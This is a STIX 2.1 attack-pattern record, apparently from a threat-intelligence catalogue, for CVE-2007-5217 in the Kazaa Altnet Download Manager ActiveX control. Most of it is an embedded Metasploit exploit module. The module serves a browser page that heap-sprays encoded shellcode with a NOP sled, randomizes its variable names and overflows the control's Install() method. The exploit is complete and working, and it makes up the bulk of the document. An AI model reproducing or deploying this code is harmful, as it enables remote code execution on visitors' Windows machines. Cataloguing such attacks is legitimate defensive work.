{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3e5b32a2-5d85-479e-8368-bf5c6c329c68",
    "created": "2024-08-14T16:40:12.660348Z",
    "modified": "2024-08-14T16:40:12.660353Z",
    "name": "Kazaa Altnet Download Manager ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the Altnet Download Manager ActiveX Control (amd4.dll) bundled with Kazaa Media Desktop 3.2.7. By sending an overly long string to the \"Install()\" method, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/kazaa_altnet_heap.rb",
            "external_id": "kazaa_altnet_heap.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-5217"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20071014051150/http://secunia.com:80/advisories/26970"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Kazaa Altnet Download Manager ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the Altnet Download Manager ActiveX\n        Control (amd4.dll) bundled with Kazaa Media Desktop 3.2.7.\n        By sending an overly long string to the \"Install()\" method, an attacker may be\n        able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-5217' ],\n          [ 'OSVDB', '37785' ],\n          [ 'URL', 'http://web.archive.org/web/20071014051150/http://secunia.com:80/advisories/26970' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP2 / IE 6.0SP1 English', { 'Ret' => '\\x0c\\x0c\\x0c\\x0c' } ]\n        ],\n      'DisclosureDate' => '2007-10-03',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Create some nops\n    nops = Rex::Text.to_unescape(make_nops(4))\n\n    # Randomize the javascript variable names\n    vname  = rand_text_alpha(rand(100) + 1)\n    var_i  = rand_text_alpha(rand(30)+2)\n    rand1  = rand_text_alpha(rand(100) + 1)\n    rand2  = rand_text_alpha(rand(100) + 1)\n    rand3  = rand_text_alpha(rand(100) + 1)\n    rand4  = rand_text_alpha(rand(100) + 1)\n    rand5  = rand_text_alpha(rand(100) + 1)\n    rand6  = rand_text_alpha(rand(100) + 1)\n    rand7  = rand_text_alpha(rand(100) + 1)\n    rand8  = rand_text_alpha(rand(100) + 1)\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    # Build out the message\n    content =\n      \"<html>\\n\" +\n      \"<object classid='clsid:DEF37997-D9C9-4A4B-BF3C-88F99EACEEC2' id='#{vname}'></object>\\n\" +\n      \"<script language='javascript'>\\n\" +\n      \"#{rand1} = unescape('#{shellcode}');\\n\" +\n      \"#{randnop} = '#{nops}';\\n\" +\n      \"#{rand2} = unescape(#{randnop});\\n\" +\n      \"#{rand3} = 20;\\n\" +\n      \"#{rand4} = #{rand3}+#{rand1}.length\\n\" +\n      \"while (#{rand2}.length<#{rand4}) #{rand2}+=#{rand2};\\n\" +\n      \"#{rand5} = #{rand2}.substring(0, #{rand4});\\n\" +\n      \"#{rand6} = #{rand2}.substring(0, #{rand2}.length-#{rand4});\\n\" +\n      \"while(#{rand6}.length+#{rand4}<0x30000) #{rand6} = #{rand6}+#{rand6}+#{rand5};\\n\" +\n      \"#{rand7} = new Array();\\n\" +\n      \"for (#{var_i}=0; #{var_i}<400; #{var_i}++) #{rand7}[#{var_i}] = #{rand6} + #{rand1};\\n\" +\n      \"#{rand8} = '#{target.ret}';\\n\" +\n      \"while (#{rand8}.length < 5000) #{rand8}+=#{rand8};\\n\" +\n      \"#{vname}.Install(#{vname} ,#{rand8} ,#{vname}, 1);\\n\" +\n      \"</script>\\n\" +\n      \"</html>\"\n\n    content = Rex::Text.randomize_space(content)\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-10-03",
    "x_mitre_platforms": [
        "win'"
    ]
}